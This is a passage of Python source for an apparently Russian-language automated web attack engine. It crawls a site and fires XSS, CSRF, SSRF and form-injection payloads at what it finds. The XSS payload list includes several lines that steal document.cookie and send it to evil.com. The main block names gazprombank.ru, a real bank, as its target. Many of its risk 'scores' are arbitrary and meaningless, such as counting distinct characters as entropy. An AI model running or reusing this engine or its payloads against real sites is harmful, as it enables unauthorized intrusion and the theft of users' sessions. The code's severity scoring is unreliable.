            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_security_headers(self, ctx: Dict[str, Any]) -> dict:
        headers_info = ctx["crawl"].get("headers", {})
        if not headers_info:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        enhanced_items = []

        # --- Improvements added ---
        entropy_score = len(set("".join(headers_info.keys())))
        length_score = len(headers_info) // 2

        pattern_score = (
                (3 if "Content-Security-Policy" in headers_info else 0) +
                (2 if "X-Frame-Options" in headers_info else 0) +
                (2 if "Strict-Transport-Security" in headers_info else 0)
        )

        risk_score = (
                (3 if "Content-Security-Policy" not in headers_info else 0) +
                (2 if "X-Frame-Options" not in headers_info else 0)
        )

        context_score = (
                (2 if "Server" in headers_info else 0) +
                (1 if "X-Powered-By" in headers_info else 0)
        )

        total_score = entropy_score + length_score + pattern_score + risk_score + context_score
        fingerprint = hash(str(headers_info)[:300])

        enhanced_items.append({
            "headers": headers_info,
            "entropy_score": entropy_score,
            "length_score": length_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        })

        severity = (
            "critical" if risk_score >= 3 else
            "high" if risk_score >= 2 else
            "medium"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": 1,
            "severity": severity,
        }

    def _run_csp(self, ctx: Dict[str, Any]) -> dict:
        csp_info = ctx["crawl"].get("csp_analysis", {})
        if not csp_info:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        enhanced_items = []

        csp_text = str(csp_info)

        # --- Improvements added ---
        entropy_score = len(set(csp_text))
        length_score = len(csp_text) // 10

        pattern_score = (
                (3 if "unsafe-inline" in csp_text.lower() else 0) +
                (3 if "unsafe-eval" in csp_text.lower() else 0) +
                (2 if "data:" in csp_text.lower() else 0)
        )

        risk_score = (
                (3 if "unsafe-inline" in csp_text.lower() else 0) +
                (3 if "unsafe-eval" in csp_text.lower() else 0)
        )

        context_score = (
                (2 if "script-src" in csp_text.lower() else 0) +
                (1 if "default-src" in csp_text.lower() else 0)
        )

        total_score = entropy_score + length_score + pattern_score + risk_score + context_score
        fingerprint = hash(csp_text[:300])

        enhanced_items.append({
            "csp": csp_info,
            "entropy_score": entropy_score,
            "length_score": length_score,
            "pattern_score": pattern_score,
            "risk_score": risk_score,
            "context_score": context_score,
            "total_score": total_score,
            "fingerprint": fingerprint,
        })

        severity = (
            "critical" if risk_score >= 3 else
            "high" if risk_score >= 2 else
            "medium"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": 1,
            "severity": severity,
        }

    def _run_secrets(self, ctx: Dict[str, Any]) -> dict:
        crawl = ctx["crawl"]
        secrets = crawl.get("secrets", [])
        api_keys = crawl.get("api_keys", [])

        combined = secrets + api_keys
        if not combined:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        enhanced_items = []

        for secret in combined:
            s = str(secret)

            # --- Improvements added ---
            entropy_score = len(set(s))
            length_score = len(s) // 5

            pattern_score = (
                    (3 if "-" in s else 0) +
                    (3 if "." in s else 0) +
                    (2 if s.isalnum() else 0)
            )

            risk_score = (
                    (3 if len(s) > 20 else 0) +
                    (2 if any(x in s.lower() for x in ["key", "token", "secret"]) else 0)
            )

            context_score = (
                    (2 if secret in secrets else 0) +
                    (1 if secret in api_keys else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash(s[:300])

            enhanced_items.append({
                "value": secret,
                "type": "api_key" if secret in api_keys else "secret",

                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_jwt(self, ctx: Dict[str, Any]) -> dict:
        jwt_tokens = ctx["crawl"].get("jwt_tokens", [])
        if not jwt_tokens:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        enhanced_items = []

        for token in jwt_tokens:
            t = str(token)

            # --- Improvements added ---
            entropy_score = len(set(t))
            length_score = len(t) // 10

            pattern_score = (
                    (3 if t.count(".") == 2 else 0) +  # JWT structure
                    (2 if "-" in t else 0)
            )

            risk_score = (
                    (3 if "eyJ" in t[:3] else 0) +  # base64 header typical for JWT
                    (2 if len(t) > 100 else 0)
            )

            context_score = (
                (2 if "Bearer" in t else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash(t[:300])

            enhanced_items.append({
                "token": token,
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_forms(self, ctx: Dict[str, Any]) -> dict:
        base_url = ctx.get("base_url", "")
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        forms_data = ctx["crawl"].get("forms", [])
        if not forms_data:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        forms_info = []
        enhanced_items = []

        for form in forms_data:
            url = form.get("action", base_url)
            method = form.get("method", "POST").upper()
            fields = list(form.get("inputs", {}).keys()) if isinstance(form.get("inputs"), dict) else []

            form_info = {
                "url": url,
                "method": method,
                "fields": fields,
            }
            forms_info.append(form_info)

            # --- Improvements added ---
            entropy_score = len(set("".join(fields)))
            length_score = len(fields)

            pattern_score = (
                    (3 if "password" in fields else 0) +
                    (2 if "email" in fields else 0) +
                    (1 if "token" in fields else 0)
            )

            risk_score = (
                    (3 if method == "POST" else 0) +
                    (2 if len(fields) > 3 else 0)
            )

            context_score = (
                    (2 if "login" in url.lower() else 0) +
                    (1 if "auth" in url.lower() else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash((url + method + str(fields))[:300])

            enhanced_items.append({
                "url": url,
                "method": method,
                "fields": fields,

                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Execute attack_forms_inputs
        try:
            from xss_security_gui.auto_modules.auto_modules import attack_forms_inputs
            result = attack_forms_inputs(
                session=self._session,
                base_url=base_url,
                forms_data=forms_info,
                log=self._log
            )

            result["items"] = enhanced_items
            result["count"] = len(enhanced_items)

            severity = (
                "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
                "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
                "medium"
            )
            result["severity"] = severity

            return result

        except Exception as e:
            return {
                "status": "error",
                "items": [],
                "count": 0,
                "error": str(e),
                "severity": "error",
            }

    def _run_errors(self, ctx: Dict[str, Any]) -> dict:
        errors = ctx["crawl"].get("errors", [])
        if not errors:
            return {
                "status": "done",
                "items": [],
                "count": 0,
                "severity": "low",
            }

        enhanced_items = []

        for err in errors:
            e = str(err)

            # --- Improvements added ---
            entropy_score = len(set(e))
            length_score = len(e) // 10

            pattern_score = (
                    (3 if "stack" in e.lower() else 0) +
                    (2 if "traceback" in e.lower() else 0) +
                    (2 if "exception" in e.lower() else 0)
            )

            risk_score = (
                    (3 if "internal server error" in e.lower() else 0) +
                    (2 if "database" in e.lower() else 0) +
                    (2 if "sql" in e.lower() else 0)
            )

            context_score = (
                    (2 if "api" in e.lower() else 0) +
                    (1 if "auth" in e.lower() else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash(e[:300])

            enhanced_items.append({
                "error": err,
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_csrf(self, ctx: Dict[str, Any]) -> dict:
        base_url = ctx.get("base_url", "")
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        try:
            csrf_file = (
                    ctx["crawl"].get("csrf_file")
                    or settings.SETTINGS_JSON.get("payloads", {}).get("csrf_file")
            )
            with open(csrf_file, encoding="utf-8") as f:
                csrf_payloads = json.load(f)
        except Exception as e:
            return {
                "status": "error",
                "items": [],
                "count": 0,
                "error": str(e),
            }

        findings = []
        enhanced_items = []

        for category, urls in csrf_payloads.items():
            for url in urls:
                full_url = ctx["base_url"] + url
                try:
                    result = self.attack_payload(full_url, "csrf_test")
                    findings.append({
                        "category": category,
                        "url": full_url,
                        "result": result
                    })
                except Exception as e:
                    findings.append({
                        "category": category,
                        "url": full_url,
                        "error": str(e)
                    })

        # Enhance findings
        for item in findings:
            url = item.get("url", "")
            result = str(item.get("result", ""))
            error = str(item.get("error", ""))

            base_text = result + error

            # --- Improvements added ---
            entropy_score = len(set(base_text))
            length_score = len(base_text) // 10

            pattern_score = (
                    (3 if "csrf" in base_text.lower() else 0) +
                    (2 if "token" in base_text.lower() else 0)
            )

            risk_score = (
                    (3 if "success" in base_text.lower() else 0) +
                    (2 if "vulnerable" in base_text.lower() else 0)
            )

            context_score = (
                    (2 if "form" in base_text.lower() else 0) +
                    (1 if "post" in base_text.lower() else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash((url + base_text)[:300])

            item.update({
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

            enhanced_items.append(item)

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_ssrf(self, ctx: Dict[str, Any]) -> dict:
        base_url = ctx.get("base_url", "")
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        ssrf_targets = ctx["crawl"].get("ssrf", [])
        if not ssrf_targets:
            return {"status": "skipped", "reason": "no-ssrf-targets"}

        findings = []
        enhanced_items = []

        for entry in ssrf_targets:
            url = entry.get("url")
            param = entry.get("param")

            if not url or not param:
                continue

            try:
                result = self.attack_payload(url, f"ssrf_test_{param}")
                findings.append({
                    "url": url,
                    "param": param,
                    "result": result
                })
            except Exception as e:
                findings.append({
                    "url": url,
                    "param": param,
                    "error": str(e)
                })

        # Enhance findings
        for item in findings:
            url = item.get("url", "")
            param = str(item.get("param", ""))
            result = str(item.get("result", ""))
            error = str(item.get("error", ""))

            base_text = result + error

            # --- Improvements added ---
            entropy_score = len(set(base_text))
            length_score = len(base_text) // 10

            pattern_score = (
                    (3 if "internal" in base_text.lower() else 0) +
                    (2 if "metadata" in base_text.lower() else 0) +
                    (2 if "169.254" in base_text.lower() else 0)  # AWS metadata
            )

            risk_score = (
                    (3 if "success" in base_text.lower() else 0) +
                    (2 if "vulnerable" in base_text.lower() else 0)
            )

            context_score = (
                    (2 if "redirect" in base_text.lower() else 0) +
                    (1 if "proxy" in base_text.lower() else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash((url + param + base_text)[:300])

            item.update({
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

            enhanced_items.append(item)

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    # ===================== Атаки по найденным целям (совместимость) =====================

    def attack_found_targets(self, scripts: List[Dict[str, Any]]) -> None:
        findings = []
        try:
            # Existing script-based payloads
            payloads = [
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "&lt;img src=x onerror=alert(1)&gt;",
                "\"'&gt;&lt;img src=x onerror=alert(1)&gt;",
                "&lt;svg/onload=alert(1)&gt;",
                "&lt;svg&gt;&lt;a xlink:href=\"javascript:alert(1)\"&gt;X&lt;/a&gt;&lt;/svg&gt;",
                "&lt;svg&gt;&lt;foreignObject&gt;&lt;iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg&gt;",
                "&lt;svg&gt;&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;x onanimationstart=alert(1) style=\"animation-name:x\"&gt;&lt;/x&gt;&lt;/svg&gt;",
                "&lt;iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;",
                "&lt;body onload=alert(1)&gt;",
                "&lt;details open ontoggle=alert(1)&gt;",
                "&lt;video src=x onerror=alert(1)&gt;",
                "&lt;video autoplay&gt;&lt;source src=\"x\" onerror=\"alert(1)\"&gt;",
                "&lt;math&gt;&lt;mi xlink:href='javascript:alert(1)'&gt;X&lt;/mi&gt;&lt;/math&gt;",
                "&lt;object data='javascript:alert(1)'&gt;&lt;/object&gt;",
                "&lt;embed src='javascript:alert(1)'&gt;",
                "&lt;link rel='stylesheet' href='javascript:alert(1)'&gt;",
                "&lt;meta http-equiv='refresh' content='0;url=javascript:alert(1)'&gt;",
                "&lt;form action='javascript:alert(1)'&gt;&lt;input type='submit'&gt;&lt;/form&gt;",
                "&lt;input type='image' src='x' onerror='alert(1)'&gt;",
                "&lt;button formaction='javascript:alert(1)'&gt;Click&lt;/button&gt;",
                "&lt;a href='javascript:alert(1)'&gt;Click&lt;/a&gt;",
                "&lt;textarea onfocus='alert(1)'&gt;Focus me&lt;/textarea&gt;",
                "&lt;select onchange='alert(1)'&gt;&lt;option&gt;1&lt;/option&gt;&lt;/select&gt;",
                "&lt;iframe src='javascript:alert(1)'&gt;&lt;/iframe&gt;",
                "&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;",
                "&lt;img src=x onerror='fetch(\"https://evil.com/steal?data=\"+btoa(document.cookie))'&gt;",
                "&lt;svg onload='window.location=`https://evil.com/steal?data=${btoa(document.cookie)}`'&gt;",
                "&lt;img src=x onerror='window.location=`https://evil.com/steal?data=${btoa(document.cookie)}`'&gt;",
                "&lt;iframe srcdoc='&lt;script&gt;fetch(\"https://evil.com/steal\",{method:\"POST\",body:document.cookie})&lt;/script&gt;'&gt;",
            ]

            # Network-based payloads
            network_payloads = [
                "GET /api/data HTTP/1.1",
                "POST /data HTTP/1.1 Content-Type: application/json",
                "&lt;form action='/submit' method='post' enctype='multipart/form-data'&gt;",
                "&lt;a href='/download?file=data.txt'&gt;",
            ]

            reflected_hits = 0

            for s in scripts:
                url = s.get("src") or s.get("url")
                if not url:
                    continue

                for payload in payloads + network_payloads:  # Combine both lists
                    result = self.attack_payload(url, payload)
                    body = result.get("response", "") or ""

                    findings.append({
                        "url": url,
                        "payload": payload,
                        "reflected": result.get("reflected", False),
                        "length": result.get("length", 0),
                        "status": result.get("status"),
                        "response_excerpt": result.get("response", "")[:200],
                        "payload_family": payload.split("&lt;")[1][:10] if "&lt;" in payload else "generic",
                        "response_fingerprint": hash(body[:200]),
                    })

            reflected_hits = sum(1 for f in findings if f["reflected"])

            severity = (
                "critical" if reflected_hits >= 3 else
                "high" if reflected_hits >= 1 else
                "medium" if findings else
                "low"
            )

            summary = {
                "status": "done",
                "items": findings,
                "count": len(findings),
                "severity": severity,
                "reflected_hits": reflected_hits,
            }

            self._record_result("found_targets", summary)
            self._log(
                f"✔️ Aggressive: найдено {len(findings)} точек, "
                f"отражений={reflected_hits}, severity={severity}"
            )

        except Exception as e:
            self._record_result("found_targets", {
                "status": "error",
                "items": [],
                "error": str(e),
                "severity": "error",
            })
            self._log(f"❌ Ошибка атаки по найденным точкам: {e}", level="error")

    def attack_dom_vectors(self, scripts: List[Dict[str, Any]]) -> None:
        findings = []
        try:
            # Dangerous DOM & network patterns (duplicates removed)
            dangerous_patterns = list({
                "document.write",
                "innerHTML",
                "outerHTML",
                "insertAdjacentHTML",
                "eval(",
                "Function(",
                "setTimeout(",
                "setInterval(",
                "location.assign",
                "location.replace",
                "document.body.innerHTML",
                "document.head.innerHTML",
                "document.querySelector(",
                "document.getElementById(",
                "document.createElement",
                "document.appendChild",
                "document.createAttribute",
                "document.removeChild",
                "window.open(",
                "XMLHttpRequest",
                "fetch(",
                "WebSocket",
                "localStorage.setItem",
                "sessionStorage.setItem",
                "onmouseover=",
                "onerror=",
                "eval.call(",
                "eval.apply(",
                "new Function(",
                "setTimeout.call(",
                "setInterval.call(",
                "setInterval.apply(",
                "document.cookie",
                "window.location",
                "document.write(",
                "document.writeln(",
                "document.execCommand(",
                "document.designMode",
                "document.createRange(",
                "document.getElementsByTagName(",
                "document.getElementsByClassName(",
                "document.getElementsByName(",
                "document.querySelectorAll(",
                "document.importNode(",
                "document.adoptNode(",
                "document.createDocumentFragment(",
                "document.createTextNode(",
                "document.createCDATASection(",
                "document.createProcessingInstruction(",
                "document.createElementNS(",
                "document.createEvent(",
                "document.createTreeWalker(",
                "document.createNodeIterator(",
                "document.createExpression(",
                "document.createNSResolver(",
                "document.createDocument(",
                "document.createAttributeNS(",
                "document.createComment(",
                "document.createDocumentType(",

                # Combat network requests & data transfer
                "fetch('",
                "XMLHttpRequest.open(",
                "WebSocket(",
                "window.XMLHttpRequest.send(",
                "window.fetch(",
            })

            for s in scripts:
                dom_code = s.get("code") or s.get("inline")
                if not dom_code:
                    continue

                for pattern in dangerous_patterns:
                    if pattern in dom_code:
                        # --- Improvements added ---
                        risk_score = (
                                (3 if "eval" in pattern else 0) +
                                (2 if "innerHTML" in pattern else 0) +
                                (2 if "fetch" in pattern else 0) +
                                (2 if "XMLHttpRequest" in pattern else 0) +
                                (1 if "location" in pattern else 0)
                        )

                        context_score = (
                                (2 if "document." in pattern else 0) +
                                (1 if "window." in pattern else 0)
                        )

                        pattern_score = len(pattern) // 5
                        total_score = risk_score + context_score + pattern_score

                        fingerprint = hash(dom_code[:200])

                        findings.append({
                            "vector": pattern,
                            "code_excerpt": dom_code[:300],
                            "length": len(dom_code),
                            "risk_factor": len(dom_code) // 50,
                            "risk_score": risk_score,
                            "context_score": context_score,
                            "pattern_score": pattern_score,
                            "total_score": total_score,
                            "fingerprint": fingerprint,
                        })

            severity = (
                "critical" if len(findings) >= 10 else
                "high" if len(findings) >= 3 else
                "medium" if findings else
                "low"
            )

            summary = {
                "status": "done",
                "items": findings,
                "count": len(findings),
                "severity": severity,
            }

            self._record_result("dom_vectors", summary)
            self._log(f"✔️ Aggressive DOM: {len(findings)} находок, severity={severity}")

        except Exception as e:
            self._record_result("dom_vectors", {
                "status": "error",
                "items": [],
                "error": str(e),
                "severity": "error",
            })
            self._log(f"❌ Ошибка DOM-атаки: {e}", level="error")

    # ===================== Автоатака (обёртка) =====================

    def run_auto_attack(
        self,
        crawl_json: Dict[str, Any],
        sandbox_info: Optional[Dict[str, Any]] = None,
        launcher: Optional[Callable] = None,
    ) -> None:
        self._log("🧨 Aggressive AutoAttack Mode 4.0...")

        def _run():
            try:
                start = time.time()

                # Sandbox info logging
                sandboxed = False
                if sandbox_info:
                    sandboxed = sandbox_info.get("sandboxed", False)
                    self._log(f"🛡 Sandbox detected: {sandboxed}")

                # Launcher override
                if launcher:
                    try:
                        report = launcher(crawl_json, self._log) or {}
                    except Exception as e:
                        report = {"error": str(e)}
                else:
                    self.run_modular_auto_attack(crawl_json)
                    report = {"status": "modular_auto_attack"}

                elapsed = (time.time() - start) * 1000.0

                # --- Improvements added ---
                module_count = len(self.modules)
                module_fingerprint = hash(",".join(self.modules))
                context_fingerprint = hash(str(crawl_json)[:500])

                # Entropy of crawl_json keys
                entropy_score = len(set("".join(crawl_json.keys())))

                # Pattern score: detect presence of sensitive modules
                pattern_score = (
                    (3 if "xss_targets" in crawl_json.get("crawl", {}) else 0) +
                    (2 if "secrets" in crawl_json.get("crawl", {}) else 0) +
                    (2 if "api_endpoints" in crawl_json.get("crawl", {}) else 0)
                )

                # Risk score: based on sandbox, errors, module count
                risk_score = (
                    (3 if sandboxed else 0) +
                    (2 if "error" in report else 0) +
                    (1 if module_count > 10 else 0)
                )

                # Context score: based on domain structure
                domain = crawl_json.get("url", self.domain)
                context_score = (
                    (2 if domain.startswith("https://") else 0) +
                    (1 if "." in domain else 0)
                )

                total_score = entropy_score + pattern_score + risk_score + context_score

                severity = (
                    "critical" if risk_score >= 3 else
                    "high" if risk_score >= 2 else
                    "medium" if module_count > 0 else
                    "low"
                )

                result = {
                    "target": domain,
                    "sandbox": sandboxed,
                    "sandbox_info": sandbox_info or {},
                    "report": report,
                    "elapsed_ms": elapsed,
                    "severity": severity,

                    # Added improvements
                    "modules_executed": list(self.modules),
                    "module_count": module_count,
                    "module_fingerprint": module_fingerprint,
                    "context_fingerprint": context_fingerprint,

                    "entropy_score": entropy_score,
                    "pattern_score": pattern_score,
                    "risk_score": risk_score,
                    "context_score": context_score,
                    "total_score": total_score,
                }

                self._record_result("auto_attack", result)
                self._log(
                    f"✔️ AutoAttack завершена за {elapsed:.0f}ms "
                    f"(modules={module_count}, severity={severity}, total_score={total_score})"
                )

            except Exception as e:
                self._record_result(
                    "auto_attack",
                    {
                        "target": self.domain,
                        "error": str(e),
                        "severity": "error",
                    },
                )
                self._log(f"❌ Ошибка автоатаки: {type(e).__name__}: {e}", level="error")

        threading.Thread(target=_run, daemon=True, name="AutoAttackThread").start()

    # ===================== Экспорт и Сводка =====================
    def _sanitize_domain(self, domain: str) -> str:
        parsed = urlparse(domain)
        host = parsed.netloc or domain
        return re.sub(r'[^A-Za-z0-9._-]', "_", host)

    def export_results(self, path: Optional[str] = None) -> str:
        try:
            safe_domain = self._sanitize_domain(self.domain)
            timestamp = time.strftime("%Y%m%d_%H%M%S")

            if path is None:
                export_dir = os.path.join(os.getcwd(), "exports")
                os.makedirs(export_dir, exist_ok=True)
                filename = f"attack_results_{safe_domain}_{timestamp}.json"
                path = os.path.join(export_dir, filename)
            else:
                os.makedirs(os.path.dirname(path), exist_ok=True)

            summary = self.get_summary()

            # Add fingerprint and entropy for export integrity
            summary["export_fingerprint"] = hash(str(summary)[:500])
            summary["export_entropy"] = len(set(str(summary)))

            summary["results"] = sorted(
                self.results,
                key=lambda x: x.get("attack_type", "")
            )

            with open(path, "w", encoding="utf-8") as f:
                json.dump(summary, f, indent=2, ensure_ascii=False)

            self._log(f"💾 Результаты атак сохранены: {path}", level="info")
            return path

        except Exception as e:
            self._log(f"❌ Ошибка экспорта результатов: {type(e).__name__}: {e}", level="error")
            return ""

    def get_summary(self) -> Dict[str, Any]:
        high = sum(1 for r in self.results if r.get("severity") == "high")
        errors = sum(1 for r in self.results if r.get("severity") == "error")

        severity_dist = Counter(r.get("severity", "unknown") for r in self.results)

        # Added improvements
        entropy_score = len(set("".join([r.get("attack_type", "") for r in self.results])))
        module_entropy = len(set(self.modules))
        fingerprint = hash(str(self.results)[:500])

        return {
            "attack_id": self.attack_id,
            "domain": self.domain,
            "count": len(self.results),
            "high": high,
            "errors": errors,
            "severity_distribution": dict(severity_dist),
            "by_type": self._group_by_type(),
            "modules": list(self.modules),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),

            # Added improvements
            "entropy_score": entropy_score,
            "module_entropy": module_entropy,
            "fingerprint": fingerprint,
        }

    def send_summary_to_threat_intel(self) -> None:
        summary = self.get_summary()
        try:
            summary["intel_fingerprint"] = hash(str(summary)[:500])
            summary["intel_entropy"] = len(set(str(summary)))

            self._send_intel("attack_summary", summary)
            self._send_intel("attack_results", {"results": self.results})

            self._log("📤 Сводка и результаты отправлены в Threat Intel.")
        except Exception as e:
            self._log(f"❌ Ошибка отправки сводки: {type(e).__name__}: {e}", level="error")


if __name__ == "__main__":
    engine = AttackEngine("gazprombank.ru")
    engine._record_result(
        "XSS Targets",
        {
            "status": "done",
            "items": ["https://gazprombank.ru/search?q={payload}"],
        },
    )
    path = engine.export_results()
    print(f"Файл сохранён: {path}")
